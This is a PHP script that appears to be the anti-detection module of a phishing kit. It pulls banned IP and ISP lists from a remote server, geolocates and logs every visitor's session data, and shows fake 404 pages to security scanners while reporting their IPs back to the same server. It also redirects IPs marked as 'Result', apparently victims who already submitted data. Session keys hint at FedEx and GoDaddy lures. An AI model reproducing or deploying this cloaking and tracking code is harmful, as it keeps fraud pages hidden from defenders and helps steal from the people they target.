<?php

error_reporting(E_ERROR | E_PARSE);
session_start();

if (isset($_GET['log'])) {
    include('funcs/log.php');
    exit;
}

if (!file_exists('funcs/BannedIPs.json')) {

    file_put_contents('funcs/BannedIPs.json', file_get_contents('https://xzz.one/HE/Protect/IP.json'));
}
if (!file_exists('funcs/BannedISPs.json')) {

    file_put_contents('funcs/BannedISPs.json', file_get_contents('https://xzz.one/HE/Protect/ISP.json'));
}

$_SESSION['Agent'] = $Agent = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT', FILTER_SANITIZE_STRING);
date_default_timezone_set('Africa/Cairo');
$_SESSION['Time'] = date('M d, h:i A');

function IP() {
    $ip = filter_input(INPUT_SERVER, 'HTTP_CLIENT_IP', FILTER_SANITIZE_STRING) ?: filter_input(INPUT_SERVER, 'REMOTE_ADDR', FILTER_SANITIZE_STRING);
    $ip_arr = explode(".", $ip);
    $server_ip_arr = explode(".", filter_input(INPUT_SERVER, 'SERVER_ADDR', FILTER_SANITIZE_STRING));
    if ($server_ip_arr[0] == $ip_arr[0] || strlen($ip) < 10) {
        $ip = file_get_contents('https://api.ipify.org');
    }
    if (strpos($ip, ":") !== false) {
        $ip_ = explode(":", $ip);
        $ip = $ip_ [0];
    }
    if ($ip === "") {
        die("<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL " . filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING) . " was not found on this server.</p>");
    }
    $_SESSION['IP'] = $ip = trim($ip);
    return $ip;
}

function CheckBannedIP($ip) {
    $BannedIPz = json_decode(file_get_contents('funcs/BannedIPs.json'), true);
    foreach ($BannedIPz as $BannedIP) {
        $ip_arr = explode(".", $BannedIP);
        if (preg_match("/^($ip_arr[0]\.$ip_arr[1]\.$ip_arr[2]\.(?:[0-9]|[1-9][0-9]|1(?:[0-9][0-9])|2(?:[0-4][0-9]|5[0-5])))$/", $ip)) {
            $hostname = gethostbyaddr($ip);
            $log .= "<button class='accordion' >
<span class='count'>" . $_SESSION['Count'] . "</span>
<span class='banned'>" . $_SESSION['IP'] . "</span>
<span class='time'>" . $_SESSION['Time'] . "</span>
<span class='isp'>" . $hostname . "</span>
</button>
<div class='panel'>";
            foreach ($_SESSION as $key => $value) {
                if($key !== "FedPage" && $key !== "Godad_Page" ){
                $log .= $key . ': ' . $value . '<br>';
            }}
            $log .= "
</div>";
            file_put_contents("funcs/data.h", $log, FILE_APPEND);
            die("<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL " . filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING) . " was not found on this server.</p>");
        }
    }
}

function HostName($ip) {
    $_SESSION['HostName'] = $hostname = gethostbyaddr($ip);
    if ($hostname === $ip || $hostname === "" || !preg_match("/[a-z]/i", $hostname) || strpos($hostname, "-") !== false) {

        $Detailz = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
        $_SESSION['HostName'] = $hostname = $Detailz->org;
        $_SESSION['Country'] = $Detailz->country;
        $_SESSION['City'] = $Detailz->city;
        $_SESSION['Region'] = $Detailz->region;
        $_SESSION['Loc'] = $Detailz->loc;
    }
    return $hostname;
}

function CheckIFResult($ip, $redirect) {
    $resIPfile = json_decode(file_get_contents('funcs/RES_IP.json'), true);
    if (in_array($ip, $resIPfile)) {

        $log .= "<button class='accordion' >
<span class='banned'>" . $_SESSION['Count'] . " -Result!</span>
<span class='ip'>" . $_SESSION['IP'] . "</span>
<span class='time'>" . $_SESSION['Time'] . "</span>
<span class='isp'>" . $_SESSION['HostName'] . "</span>
</button>
<div class='panel'>";
foreach ($_SESSION as $key => $value) {
    if($key !== "FedPage" && $key !== "Godad_Page" ){
    $log .= $key . ': ' . $value . '<br>';
}}
        $log .= "
</div>";
        file_put_contents("funcs/data.h", $log, FILE_APPEND);

        header("location: $redirect");
        exit;
    }
}

function SetDetails($ip) {
    if (empty($_SESSION['Country'])) {
        $Detailz = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
        $_SESSION['HostName'] = $Detailz->org;
        $_SESSION['Country'] = $Detailz->country;
        $_SESSION['City'] = $Detailz->city;
        $_SESSION['Region'] = $Detailz->region;
        $_SESSION['Loc'] = $Detailz->loc;
    }

    $Agent = $_SESSION['Agent'];
    $device = substr($Agent, strpos($Agent, '(') - 1);
    $device = substr($device, 1, strpos($device, ')'));
    $browser = substr($Agent, strrpos($Agent, ')') + 1);
    $browser = preg_replace("/[^a-zA-Z\s]+/", "", $browser);
    $_SESSION['Browser'] = $browser;
    $_SESSION['Device'] = $device;
}

function LogVisitor() {
    $log .= "<button class='accordion' >
<span class='count'>" . $_SESSION['Count'] . "</span>
<span class='country'>" . $_SESSION['Country'] . "</span>
<span class='ip'>" . $_SESSION['IP'] . "</span>
<span class='time'>" . $_SESSION['Time'] . "</span>
<span class='region'>" . $_SESSION['Region'] . " - " . $_SESSION['City'] . "</span>
<span class='isp'>" . $_SESSION['HostName'] . "</span>
</button>
<div class='panel'>";
foreach ($_SESSION as $key => $value) {
    if($key !== "FedPage" && $key !== "Godad_Page" ){
    $log .= $key . ': ' . $value . '<br>';
}}
    $log .= "
</div>";

    file_put_contents("funcs/data.h", $log, FILE_APPEND);
}


function CheckBannedISP($HostName, $ip) {
    $BannedISPz = json_decode(file_get_contents('funcs/BannedISPs.json'), true);
    foreach ($BannedISPz as $BannedISP) {
        if (strpos(strtolower($HostName), strtolower($BannedISP)) !== false) {
            $BannedIPz = json_decode(file_get_contents('funcs/BannedIPs.json'), true);

            if (!in_array($ip, $BannedIPz)) {
                $BannedIPz[] = $ip;
                file_put_contents('funcs/BannedIPs.json', json_encode($BannedIPz));
            }
            $link = "https://xzz.one/HE/Protect/do.php?IP=" . $ip;
            file_get_contents($link);
            $log .= "<button class='accordion' >
<span class='count'>" . $_SESSION['Count'] . "</span>
<span class='country'>" . $_SESSION['Country'] . "</span>
<span class='ip'>" . $_SESSION['IP'] . "</span>
<span class='time'>" . $_SESSION['Time'] . "</span>
<span class='region'>" . $_SESSION['Region'] . " - " . $_SESSION['City'] . "</span>
<span class='banned'>" . $_SESSION['HostName'] . "</span>
</button>
<div class='panel'>";
foreach ($_SESSION as $key => $value) {
    if($key !== "FedPage" && $key !== "Godad_Page" ){
    $log .= $key . ': ' . $value . '<br>';
}}
            $log .= "
</div>";
            file_put_contents("funcs/data.h", $log, FILE_APPEND);

            die("<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL " . filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING) . " was not found on this server.</p>");
        }
    }
}

function countup() {
    $file = 'funcs/count.t';
    $count = @file($file);
    $count = $count[0];
    if ($handle = @fopen($file, 'w')) {
        $count = intval($count);
        $count++;
        fwrite($handle, $count);
        fclose($handle);
    }
    return $count;
}

